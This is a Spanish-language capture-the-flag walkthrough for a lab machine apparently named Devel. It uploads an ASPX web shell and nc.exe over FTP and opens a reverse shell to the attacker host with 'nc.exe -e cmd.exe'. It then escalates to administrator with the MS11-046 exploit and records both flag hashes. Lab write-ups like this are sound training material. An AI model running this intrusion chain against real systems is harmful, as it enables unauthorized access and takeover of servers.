	DEVEL	10.10.10.5

+++++ INFORMACION ENTREGADA:++++++++++++++++++++++++++++++++++++++++++++++++++++
	Para conseguir una shell, descargar de la web 
	https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/FuzzDB
	los ficheros cmd.aspx y nc.exe 
	wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/cmd.aspx
	wget https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/nc.exe
	
	Realizar la conexion FTP.
	ftp > put cmd.aspx
	ftp> dir
	200 PORT command successful.
	125 Data connection already open; Transfer starting.
	03-18-17  02:06AM       <DIR>          aspnet_client
	04-07-20  09:40PM                 1438 cmd.aspx
	03-17-17  05:37PM                  689 iisstart.htm
	03-17-17  05:37PM               184946 welcome.png
	
	ftp > binary
	ftp > put nc.exe

	En un navegador escribir http://10.10.10.5/cmd.aspx
	Muestra una ventana de comandos, probar:
	whoami --> iis apppool\web		(usuario web limitado)
	
	Buscar en nuestro sistema operativo el fichero smbserver.py
	locate smbserver.py
	Estando en el directorio donde están todos los ficheros que estamos subiendo.
	cp /usr/share/doc/python3-impacket/examples/smbserver.py .
	
	Ejecutamos el servidor smb. python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
	Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

	[*] Config file parsed
	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
	[*] Config file parsed
	[*] Config file parsed
	[*] Config file parsed

	En el navegador dentro de la ventana que inicia con cmd.aspx, escribr:
	\\10.10.14.37\share\nc.exe -e cmd.exe 10.10.14.37 443
	En otra ventana ejecutar nc -lnvp 443  para abrir la shell remota.
	c:\windows\system32\inetsrv>

	Ejecutar un exploit para elevar privilegios con la vulnerabilidad MS11-046
	Descargar el exploit desde la web:
	https://github.com/abatchy17/WindowsExploits
	Descargar el fichero ms11-046.exe
	wget https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe
	
	En la consola de Devel que hemos de conseguir, copiar el fichero MS11-046.exe
	c:\windows\system32\inetsrv>\\10.10.14.37\share\MS11-046.exe

	Conseguimos una consola como admisnistrador.
	c:\windows\system32>
	
	

+++++ FASE DE POSTEXPLOTACION ++++++++++++++++++++++++++++++++++++

FLAG ADMINISTRADOR/ROOT
c:\Users\Administrator\Desktop>more root.txt.txt
more root.txt.txt
e621a0b5041708797c4fc4728bc72b4b

FLAG USUARIO/User
c:\Users\babis\Desktop>more user.txt.txt
more user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8

